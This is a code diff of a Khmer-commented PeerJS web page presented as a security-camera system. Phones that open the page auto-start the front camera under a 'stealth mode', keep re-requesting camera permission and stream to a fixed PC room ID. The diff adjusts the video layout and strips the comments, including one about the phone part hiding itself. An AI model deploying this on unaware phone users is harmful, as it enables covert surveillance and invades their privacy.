@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ប្រព័ន្ធកាមេរ៉ាសុវត្ថិភាព ជំនាន់ភ្ជាប់ស្វ័យប្រវត្តពេញអេក្រង់</title>
+    <title>ប្រព័ន្ធកាមេរ៉ាសុវត្ថិភាព ជំនាន់រក្សាទម្រង់ទូរសព្ទពេញអេក្រង់</title>
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
     <style>
-        /* កំណត់ឱ្យពេញអេក្រង់ និងផ្ទៃខ្មៅងងឹត */
+        /* កំណត់ផ្ទៃខាងក្រោយខ្មៅងងឹតទាំងស្រុង */
         html, body { 
             margin: 0; 
             padding: 0; 
@@ -17,11 +17,21 @@
             font-family: sans-serif; 
         }
 
-        /* វីដេអូពេញអេក្រង់កុំព្យូទ័រអូតូ */
+        /* 🖥️ ផ្ទាំងបញ្ជាកុំព្យូទ័រ៖ រៀបចំឱ្យវីដេអូស្ថិតនៅចំកណ្តាលអេក្រង់ស្អាត */
+        #pc-ui {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #000000;
+        }
+
+        /* 📱 កូដពិសេសកំណត់ឱ្យវីដេអូចេញទម្រង់ទូរសព្ទ ប៉ុន្តែពង្រីកកម្ពស់ពេញអេក្រង់កុំព្យូទ័រ */
         video { 
-            width: 100%; 
-            height: 100%; 
-            object-fit: cover; 
+            height: 100vh;      /* បង្ខំឱ្យកម្ពស់លាតសន្ធឹងពេញអេក្រង់កុំព្យូទ័រពីលើចុះក្រោម */
+            width: auto;        /* ឱ្យទទឹងពង្រីកអូតូទៅតាមរាងទូរសព្ទដើម្បីកុំឱ្យបែករូបភាព */
+            object-fit: contain; /* រក្សាសមាមាត្រដើមរបស់កាមេរ៉ាទូរសព្ទ ១០០% */
             background: #000; 
             display: none; 
         }
@@ -56,10 +66,8 @@
     </div>
 
     <script>
-        // បង្កើតឈ្មោះបន្ទប់ថ្មីស្រឡាងដើម្បីកុំឱ្យជាន់ប្រព័ន្ធចាស់ដែលគាំង
         const LIVE_ROOM_ID = 'hino-auto-secure-cam-2026';
         
-        // ប្រព័ន្ធទម្លុះ Firewall របស់ Google ជួយឱ្យរកគ្នាឃើញអូតូ
         const peerConfig = {
             config: {
                 iceServers: [
@@ -73,28 +81,24 @@
         let peer = null;
         let currentCall = null; 
         let localStream = null;
-        let isMobileDevice = false;
 
         window.onload = function() {
-            isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
 
             if (!isMobileDevice) {
-                // កុំព្យូទ័រ
                 runAsPC();
             } else {
-                // ទូរសព្ទ
                 document.body.classList.add('phone-stealth-mode');
                 startCamera();
             }
         };
 
-        // --- ផ្នែកកុំព្យូទ័រ (ទទួលរូបភាពអូតូ) ---
+        // --- ផ្នែកកុំព្យូទ័រ ---
         function runAsPC() {
             if (peer) peer.destroy();
             peer = new Peer(LIVE_ROOM_ID, peerConfig);
 
             peer.on('call', (call) => {
-                // បដិសេធការហៅត្រួតគ្នា បើមានការហៅចូលចាស់កំពុងដើរ
                 if (currentCall) {
                     call.answer();
                     setTimeout(() => { call.close(); }, 500);
@@ -110,13 +114,10 @@
                     video.style.display = 'block';
                     video.srcObject = remoteStream;
                     
-                    // បញ្ជាឱ្យលេងអូតូភ្លាមៗ
                     video.play().catch(err => {
-                        console.log("Autoplay restriction:", err);
-                        // ករណីបើ Browser Chrome លើកុំព្យូទ័រទាមទារឱ្យប៉ះអេក្រង់មុន
                         document.getElementById('status').style.display = 'block';
                         document.getElementById('status').style.color = '#ff3333';
-                        document.getElementById('status').innerText = "🛑 សូមចុចលើអេក្រង់កុំព្យូទ័រ ១ដង ដើម្បីបើករូបភាពអូតូ";
+                        document.getElementById('status').innerText = "🛑 សូមចុចលើអេក្រង់កុំព្យូទ័រ ១ដង ដើម្បីបើករូបភាពអូត";
                         
                         document.body.onclick = () => {
                             video.play();
@@ -131,7 +132,6 @@
             });
 
             peer.on('error', (err) => {
-                console.log("PC Peer Error, លោតភ្ជាប់ឡើងវិញអូតូ...", err);
                 setTimeout(runAsPC, 2000);
             });
         }
@@ -146,7 +146,7 @@
             currentCall = null; 
         }
 
-        // --- ផ្នែកទូរសព្ទ (បាញ់រូបភាពអូតូ និងលាក់ខ្លួន) ---
+        // --- ផ្នែកទូរសព្ទ ---
         function startCamera() {
             navigator.mediaDevices.getUserMedia({
                 video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
@@ -157,8 +157,6 @@
                 connectToPC();
             })
             .catch((err) => {
-                console.error("កាមេរ៉ាបិទសិទ្ធិ Permissions៖", err);
-                // ព្យាយាមបើកឡើងវិញរាល់ ៥ វិនាទី បើអ្នកប្រើភ្លេចចុច Allow
                 setTimeout(startCamera, 5000);
             });
         }
@@ -168,19 +166,17 @@
             peer = new Peer(peerConfig); 
 
             peer.on('open', (id) => {
-                // ប្រព័ន្ធហៅទៅកុំព្យូទ័រអូតូ
                 const call = peer.call(LIVE_ROOM_ID, localStream);
                 if (call) {
                     currentCall = call;
                     call.on('close', () => {
                         currentCall = null;
-                        setTimeout(connectToPC, 3000); // បើដាច់ ឱ្យហៅទៅរកកុំព្យូទ័រឡើងវិញអូតូ
+                        setTimeout(connectToPC, 3000);
                     });
                 }
             });
 
             peer.on('error', (err) => {
-                // បើមានបញ្ហាអ៊ីនធឺណិត ឱ្យព្យាយាមភ្ជាប់ទៅកុំព្យូទ័រឡើងវិញរៀងរាល់ ៤ វិនាទីអូតូ
                 setTimeout(connectToPC, 4000);
             });
         }
